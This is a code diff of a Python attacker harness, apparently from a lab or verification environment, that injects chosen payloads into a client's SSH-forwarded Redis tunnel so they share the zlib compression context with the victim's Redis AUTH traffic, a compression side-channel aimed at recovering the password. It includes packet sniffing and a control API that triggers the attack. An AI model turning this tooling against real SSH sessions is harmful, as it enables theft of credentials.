@@ -16,6 +16,11 @@ Three things happen here:
   3. An aiohttp HTTP control API on :9000 lets the verification driver
      query / clear the recorded packet log, trigger the client to send
      a Redis AUTH, and run the full attack.
+
+The attack injects payloads by opening TCP connections to the client's
+exposed Redis tunnel port.  Each connection creates a ``direct-tcpip``
+SSH channel that shares the c->s zlib compression context with the
+victim's Redis AUTH traffic.
 """
 
 import asyncio
@@ -40,7 +45,7 @@ LISTEN_PORT = int(os.environ.get("LISTEN_PORT", "2222"))
 HTTP_PORT = int(os.environ.get("HTTP_PORT", "9000"))
 CLIENT_CONTROL_URL = os.environ.get("CLIENT_CONTROL_URL", "http://client:8000")
 CLIENT_HOST = os.environ.get("CLIENT_HOST", "client")
-WEB_TUNNEL_PORT = int(os.environ.get("WEB_TUNNEL_PORT", "8080"))
+TUNNEL_PORT = int(os.environ.get("TUNNEL_PORT", "6379"))
 
 SNIFF_FILTER = f"tcp and (port {SERVER_PORT} or port {LISTEN_PORT})"
 SNIFF_IFACE = os.environ.get("SNIFF_IFACE", "eth0")
@@ -199,16 +204,16 @@ async def handle_trigger_secret(request: web.Request) -> web.Response:
 
 
 async def handle_trigger_payload(request: web.Request) -> web.Response:
-    """Send a payload through the client's web tunnel port forward.
+    """Send a payload through the client's exposed tunnel port forward.
 
-    The attacker opens a TCP connection to client:8080 (the publicly
-    bound web tunnel) and writes the payload.  This data enters the
-    SSH tunnel as direct-tcpip channel data in the c->s direction.
+    The attacker opens a TCP connection to the client's Redis tunnel
+    and writes the payload.  This data enters the SSH tunnel as
+    direct-tcpip channel data in the c->s direction.
     """
     payload = await request.read()
     try:
         reader, writer = await asyncio.open_connection(
-            CLIENT_HOST, WEB_TUNNEL_PORT,
+            CLIENT_HOST, TUNNEL_PORT,
         )
         writer.write(payload)
         await writer.drain()
